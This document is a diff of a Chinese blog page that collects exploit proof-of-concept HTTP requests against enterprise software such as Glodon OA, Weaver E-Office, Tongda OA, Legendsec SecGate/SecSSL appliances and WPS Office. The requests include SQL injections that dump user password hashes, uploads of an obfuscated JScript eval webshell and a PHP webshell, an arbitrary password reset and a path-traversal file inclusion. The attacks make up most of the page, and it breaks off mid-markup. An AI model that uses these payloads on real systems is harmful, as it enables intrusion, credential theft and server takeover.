@@ -237,10 +237,10 @@
     <div class="main-left--info">
       <img src="/imgs/avatar.jpg"" class="main-left--avatar" />
       <div class="main-left--intro">
-        <p class="main-left--name">Cola.</p>
+        <p class="main-left--name">freelander</p>
         <div class="main-left--tags">
-          <span class="main-left--tag">中二</span>
-          <span class="main-left--tag">宅</span>
+          <span class="main-left--tag">旅游</span>
+          <span class="main-left--tag">音乐</span>
         </div>
       </div>
     </div>
@@ -335,7 +335,7 @@
       </p>
       <p class="main-left--subtitle">
         <span>上线时间：</span>
-        <span>551天</span>
+        <span>5天</span>
       </p>
       <p class="main-left--subtitle">
         <span>当前版本：</span>
@@ -367,6 +367,11 @@ pre::-webkit-scrollbar-thumb {
 pre:active {
   background-color: rgb(81, 95, 116);
 }
+
+  .catelogue {
+    max-height: 300px; /* 设置目录容器的最大高度 */
+    overflow-y: auto; /* 添加垂直滚动条 */
+  }
 </style>
 
 <div class="article-container">
@@ -395,28 +400,128 @@ pre:active {
     <article class="article-content">
       <h2 id="广联达oa-sql注入漏洞POC"><a href="#广联达oa-sql注入漏洞POC" class="headerlink" title="广联达oa sql注入漏洞POC"></a>广联达oa sql注入漏洞POC</h2><h5 id="资产特征"><a href="#资产特征" class="headerlink" title="资产特征"></a>资产特征</h5><p>鹰图：web.body&#x3D;“&#x2F;Services&#x2F;Identification&#x2F;Server&#x2F;”</p>
 <p>fofa ：“&#x2F;Services&#x2F;Identification&#x2F;Server&#x2F;“或者fid&#x3D;”&#x2F;yV4r5PdARKT4jaqLjJYqw&#x3D;&#x3D;”</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1</span><br><span class="line">Host: xxx.com</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36</span><br><span class="line">(KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml</span><br><span class="line">xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/</span><br><span class="line">signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://xxx.com:8888/Services/Identification/Server/Incompatible.aspx</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie:</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 88</span><br><span class="line"></span><br><span class="line">dasdas=&amp;key=1&#x27; UNION ALL SELECT top 1812 concat(F_CODE,&#x27;:&#x27;,F_PWD_MD5) from</span><br><span class="line">T_ORG_USER --</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;Webservice&#x2F;IM&#x2F;Config&#x2F;ConfigService.asmx&#x2F;GetIMDictionary HTTP&#x2F;1.1
+Host: xxx.com
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36
+(KHTML, like Gecko) Chrome&#x2F;115.0.0.0 Safari&#x2F;537.36
+Accept: text&#x2F;html,application&#x2F;xhtml
+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;
+signed-exchange;v&#x3D;b3;q&#x3D;0.7
+Referer: http:&#x2F;&#x2F;xxx.com:8888&#x2F;Services&#x2F;Identification&#x2F;Server&#x2F;Incompatible.aspx
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q&#x3D;0.9
+Cookie:
+Connection: close
+Content-Type: application&#x2F;x-www-form-urlencoded
+Content-Length: 88
+
+dasdas&#x3D;&amp;key&#x3D;1&#39; UNION ALL SELECT top 1812 concat(F_CODE,&#39;:&#39;,F_PWD_MD5) from
+T_ORG_USER --
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
 
-<h2 id="广联达oa-后台文件上传漏洞POC"><a href="#广联达oa-后台文件上传漏洞POC" class="headerlink" title="广联达oa 后台文件上传漏洞POC"></a>广联达oa 后台文件上传漏洞POC</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">POST /gtp/im/services/group/msgbroadcastuploadfile.aspx HTTP/1.1</span><br><span class="line">Host: 10.10.10.1:8888</span><br><span class="line">X-Requested-With: Ext.basex</span><br><span class="line">Accept: text/html, application/xhtml+xml, image/jxr, */*</span><br><span class="line">Accept-Language: zh-Hans-CN,zh-Hans;q=0.5</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36</span><br><span class="line">(KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: multipart/form-data; boundary=----</span><br><span class="line">WebKitFormBoundaryFfJZ4PlAZBixjELj</span><br><span class="line">Accept: */*</span><br><span class="line">Origin: http://10.10.10.1</span><br><span class="line">Referer: http://10.10.10.1:8888/Workflow/Workflow.aspx?configID=774d99d7-02bf-</span><br><span class="line">42ec-9e27-</span><br><span class="line">caeaa699f512&amp;menuitemid=120743&amp;frame=1&amp;modulecode=GTP.Workflow.TaskCenterModule&amp;t</span><br><span class="line">abID=40</span><br><span class="line">Cookie:</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 421</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryFfJZ4PlAZBixjELj</span><br><span class="line">Content-Disposition: form-data; filename=&quot;1.aspx&quot;;filename=&quot;1.jpg&quot;</span><br><span class="line">Content-Type: application/text</span><br><span class="line">&lt;%@ Page Language=&quot;Jscript&quot; Debug=true%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">var FRWT=&#x27;XeKBdPAOslypgVhLxcIUNFmStvYbnJGuwEarqkifjTHZQzCoRMWD&#x27;;</span><br><span class="line">var GFMA=Request.Form(&quot;qmq1&quot;);</span><br><span class="line">var ONOQ=FRWT(19) + FRWT(20) + FRWT(8) + FRWT(6) + FRWT(21) + FRWT(1);</span><br><span class="line">eval(GFMA, ONOQ);</span><br><span class="line">%&gt;</span><br><span class="line">------WebKitFormBoundaryFfJZ4PlAZBixjELj--</span><br></pre></td></tr></table></figure>
+<h2 id="广联达oa-后台文件上传漏洞POC"><a href="#广联达oa-后台文件上传漏洞POC" class="headerlink" title="广联达oa 后台文件上传漏洞POC"></a>广联达oa 后台文件上传漏洞POC</h2><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;gtp&#x2F;im&#x2F;services&#x2F;group&#x2F;msgbroadcastuploadfile.aspx HTTP&#x2F;1.1
+Host: 10.10.10.1:8888
+X-Requested-With: Ext.basex
+Accept: text&#x2F;html, application&#x2F;xhtml+xml, image&#x2F;jxr, *&#x2F;*
+Accept-Language: zh-Hans-CN,zh-Hans;q&#x3D;0.5
+User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36
+(KHTML, like Gecko) Chrome&#x2F;107.0.0.0 Safari&#x2F;537.36
+Accept-Encoding: gzip, deflate
+Content-Type: multipart&#x2F;form-data; boundary&#x3D;----
+WebKitFormBoundaryFfJZ4PlAZBixjELj
+Accept: *&#x2F;*
+Origin: http:&#x2F;&#x2F;10.10.10.1
+Referer: http:&#x2F;&#x2F;10.10.10.1:8888&#x2F;Workflow&#x2F;Workflow.aspx?configID&#x3D;774d99d7-02bf-
+42ec-9e27-
+caeaa699f512&amp;menuitemid&#x3D;120743&amp;frame&#x3D;1&amp;modulecode&#x3D;GTP.Workflow.TaskCenterModule&amp;t
+abID&#x3D;40
+Cookie:
+Connection: close
+Content-Length: 421
+
+
+------WebKitFormBoundaryFfJZ4PlAZBixjELj
+Content-Disposition: form-data; filename&#x3D;&quot;1.aspx&quot;;filename&#x3D;&quot;1.jpg&quot;
+Content-Type: application&#x2F;text
+&lt;%@ Page Language&#x3D;&quot;Jscript&quot; Debug&#x3D;true%&gt;
+&lt;%
+var FRWT&#x3D;&#39;XeKBdPAOslypgVhLxcIUNFmStvYbnJGuwEarqkifjTHZQzCoRMWD&#39;;
+var GFMA&#x3D;Request.Form(&quot;qmq1&quot;);
+var ONOQ&#x3D;FRWT(19) + FRWT(20) + FRWT(8) + FRWT(6) + FRWT(21) + FRWT(1);
+eval(GFMA, ONOQ);
+%&gt;
+------WebKitFormBoundaryFfJZ4PlAZBixjELj--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
 
-<h2 id="网神-SecGate-3600-防火墙-obj-app-upfile-任意文件上传漏洞-POC"><a href="#网神-SecGate-3600-防火墙-obj-app-upfile-任意文件上传漏洞-POC" class="headerlink" title="网神 SecGate 3600 防火墙 obj_app_upfile 任意文件上传漏洞 POC"></a>网神 SecGate 3600 防火墙 obj_app_upfile 任意文件上传漏洞 POC</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">POST /?g=obj_app_upfile HTTP/1.1</span><br><span class="line">Host: x.x.x.x   //攻击的网站域名或者ip</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Length: 574</span><br><span class="line">Content-Type: multipart/form-data; boundary=----</span><br><span class="line">WebKitFormBoundaryJpMyThWnAxbcBBQc</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryJpMyThWnAxbcBBQc</span><br><span class="line">Content-Disposition: form-data; name=&quot;MAX_FILE_SIZE&quot;</span><br><span class="line"></span><br><span class="line">10000000</span><br><span class="line">------WebKitFormBoundaryJpMyThWnAxbcBBQc</span><br><span class="line">Content-Disposition: form-data; name=&quot;upfile&quot;; filename=&quot;vulntest.php&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">&lt;?php php马?&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryJpMyThWnAxbcBBQc</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit_post&quot;</span><br><span class="line"></span><br><span class="line">obj_app_upfile</span><br><span class="line">------WebKitFormBoundaryJpMyThWnAxbcBBQc</span><br><span class="line">Content-Disposition: form-data; name=&quot;__hash__&quot;</span><br><span class="line"></span><br><span class="line">0b9d6b1ab7479ab69d9f71b05e0e9445</span><br><span class="line">------WebKitFormBoundaryJpMyThWnAxbcBBQc--</span><br></pre></td></tr></table></figure>
+<h2 id="网神-SecGate-3600-防火墙-obj-app-upfile-任意文件上传漏洞-POC"><a href="#网神-SecGate-3600-防火墙-obj-app-upfile-任意文件上传漏洞-POC" class="headerlink" title="网神 SecGate 3600 防火墙 obj_app_upfile 任意文件上传漏洞 POC"></a>网神 SecGate 3600 防火墙 obj_app_upfile 任意文件上传漏洞 POC</h2><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;?g&#x3D;obj_app_upfile HTTP&#x2F;1.1
+Host: x.x.x.x   &#x2F;&#x2F;攻击的网站域名或者ip
+Accept: *&#x2F;*
+Accept-Encoding: gzip, deflate
+Content-Length: 574
+Content-Type: multipart&#x2F;form-data; boundary&#x3D;----
+WebKitFormBoundaryJpMyThWnAxbcBBQc
+User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident&#x2F;4.0)
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">马儿路径：attachements/xxx.php</span><br></pre></td></tr></table></figure>
+------WebKitFormBoundaryJpMyThWnAxbcBBQc
+Content-Disposition: form-data; name&#x3D;&quot;MAX_FILE_SIZE&quot;
+
+10000000
+------WebKitFormBoundaryJpMyThWnAxbcBBQc
+Content-Disposition: form-data; name&#x3D;&quot;upfile&quot;; filename&#x3D;&quot;vulntest.php&quot;
+Content-Type: text&#x2F;plain
+
+&lt;?php php马?&gt;
+
+------WebKitFormBoundaryJpMyThWnAxbcBBQc
+Content-Disposition: form-data; name&#x3D;&quot;submit_post&quot;
+
+obj_app_upfile
+------WebKitFormBoundaryJpMyThWnAxbcBBQc
+Content-Disposition: form-data; name&#x3D;&quot;__hash__&quot;
+
+0b9d6b1ab7479ab69d9f71b05e0e9445
+------WebKitFormBoundaryJpMyThWnAxbcBBQc--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">马儿路径：attachements&#x2F;xxx.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 
 
-<h2 id="网神-SecSSL-3600安全接入网关系统-任意密码修改漏洞-POC"><a href="#网神-SecSSL-3600安全接入网关系统-任意密码修改漏洞-POC" class="headerlink" title="网神 SecSSL 3600安全接入网关系统 任意密码修改漏洞 POC"></a>网神 SecSSL 3600安全接入网关系统 任意密码修改漏洞 POC</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /changepass.php?type=2</span><br><span class="line"></span><br><span class="line">Cookie: admin_id=1; gw_user_ticket=ffffffffffffffffffffffffffffffff;</span><br><span class="line">last_step_param=&#123;&quot;this_name&quot;:&quot;test&quot;,&quot;subAuthId&quot;:&quot;1&quot;&#125;</span><br><span class="line">old_pass=&amp;password=Test123!@&amp;repassword=Test123!@</span><br></pre></td></tr></table></figure>
+<h2 id="网神-SecSSL-3600安全接入网关系统-任意密码修改漏洞-POC"><a href="#网神-SecSSL-3600安全接入网关系统-任意密码修改漏洞-POC" class="headerlink" title="网神 SecSSL 3600安全接入网关系统 任意密码修改漏洞 POC"></a>网神 SecSSL 3600安全接入网关系统 任意密码修改漏洞 POC</h2><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;changepass.php?type&#x3D;2
+
+Cookie: admin_id&#x3D;1; gw_user_ticket&#x3D;ffffffffffffffffffffffffffffffff;
+last_step_param&#x3D;&#123;&quot;this_name&quot;:&quot;test&quot;,&quot;subAuthId&quot;:&quot;1&quot;&#125;
+old_pass&#x3D;&amp;password&#x3D;Test123!@&amp;repassword&#x3D;Test123!@<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
 
 
 
 <h2 id="泛微-OA-代码执行-EXP"><a href="#泛微-OA-代码执行-EXP" class="headerlink" title="泛微 OA 代码执行 EXP"></a>泛微 OA 代码执行 EXP</h2><p>描述和影响范围<br>Weaver E-Office9版本存在代码问题漏洞，该漏洞源于文件&#x2F;inc&#x2F;jquery&#x2F;uploadify&#x2F;uploadify.php存在问<br>题，对参数Filedata的操作会导致不受限制的上传。<br>Weaver E-Office9.0</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST /inc/jquery/uploadify/uploadify.php HTTP/1.1</span><br><span class="line">Host: 192.168.232.137:8082</span><br><span class="line">User-Agent: test</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 493</span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line">Content-Type: multipart/form-data;</span><br><span class="line">boundary=25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85</span><br><span class="line"></span><br><span class="line">--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85</span><br><span class="line">Content-Disposition: form-data; name=&quot;Filedata&quot;; filename=&quot;666.php&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line"></span><br><span class="line">--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--</span><br><span class="line">--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;inc&#x2F;jquery&#x2F;uploadify&#x2F;uploadify.php HTTP&#x2F;1.1
+Host: 192.168.232.137:8082
+User-Agent: test
+Connection: close
+Content-Length: 493
+Accept-Encoding: gzip
+Content-Type: multipart&#x2F;form-data;
+boundary&#x3D;25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85
+
+--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85
+Content-Disposition: form-data; name&#x3D;&quot;Filedata&quot;; filename&#x3D;&quot;666.php&quot;
+Content-Type: application&#x2F;octet-stream
+
+&lt;?php phpinfo();?&gt;
+
+--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--
+--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85
+Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;&quot;
+Content-Type: application&#x2F;octet-stream
+
+--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
 
@@ -425,11 +530,28 @@ pre:active {
 <p>是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是适合各个行业用户的综合管理办公</p>
 <p>平台</p>
 <p>本次范围：通达OA版本11.10之前</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">GET /general/system/seal_manage/dianju/delete_log.php?</span><br><span class="line">DELETE_STR=1)%20and%20(substr(DATABASE(),1,1))=char(84)%20and%20(select%20count(*</span><br><span class="line">)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1</span><br><span class="line">)=(1 HTTP/1.1</span><br><span class="line">Host: 192.168.232.137:8098</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101</span><br><span class="line">Firefox/116.0</span><br><span class="line">Accept:</span><br><span class="line">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q</span><br><span class="line">=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: PHPSESSID=1u7tsd1cpgp9qvco726smb50h5; USER_NAME_COOKIE=admin;</span><br><span class="line">OA_USER_ID=admin; SID_1=779f3f46</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">GET &#x2F;general&#x2F;system&#x2F;seal_manage&#x2F;dianju&#x2F;delete_log.php?
+DELETE_STR&#x3D;1)%20and%20(substr(DATABASE(),1,1))&#x3D;char(84)%20and%20(select%20count(*
+)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1
+)&#x3D;(1 HTTP&#x2F;1.1
+Host: 192.168.232.137:8098
+User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko&#x2F;20100101
+Firefox&#x2F;116.0
+Accept:
+text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,*&#x2F;*;q
+&#x3D;0.8
+Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: PHPSESSID&#x3D;1u7tsd1cpgp9qvco726smb50h5; USER_NAME_COOKIE&#x3D;admin;
+OA_USER_ID&#x3D;admin; SID_1&#x3D;779f3f46
+Upgrade-Insecure-Requests: 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
 
-<h2 id="泛微-Weaver-E-Office9-前台文件包含"><a href="#泛微-Weaver-E-Office9-前台文件包含" class="headerlink" title="泛微 Weaver E-Office9 前台文件包含"></a>泛微 Weaver E-Office9 前台文件包含</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://URL/E-mobile/App/Init.php?</span><br><span class="line">weiApi=1&amp;sessionkey=ee651bec023d0db0c233fcb562ec7673_admin&amp;m=12344554_../../attac</span><br><span class="line">hment/xxx.xls</span><br></pre></td></tr></table></figure>
+<h2 id="泛微-Weaver-E-Office9-前台文件包含"><a href="#泛微-Weaver-E-Office9-前台文件包含" class="headerlink" title="泛微 Weaver E-Office9 前台文件包含"></a>泛微 Weaver E-Office9 前台文件包含</h2><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;URL&#x2F;E-mobile&#x2F;App&#x2F;Init.php?
+weiApi&#x3D;1&amp;sessionkey&#x3D;ee651bec023d0db0c233fcb562ec7673_admin&amp;m&#x3D;12344554_..&#x2F;..&#x2F;attac
+hment&#x2F;xxx.xls<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 
 
@@ -437,59 +559,348 @@ pre:active {
 <p>WPS Office 2019 企业版 &lt; 11.8.2.12085</p>
 <p>POC</p>
 <p>在1.html当前路径下启动http server并监听80端口，修改hosts文件（测试写死的）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 clientweb.docer.wps.cn.cloudwps.cn</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">127.0.0.1 clientweb.docer.wps.cn.cloudwps.cn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>漏洞触发需让域名规则满足clientweb.docer.wps.cn.{xxxxx}wps.cn cloudwps.cn和wps.cn没有任何关</p>
 <p>系</p>
 <p>代码块在底下。（需要原pdf加wechat）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span 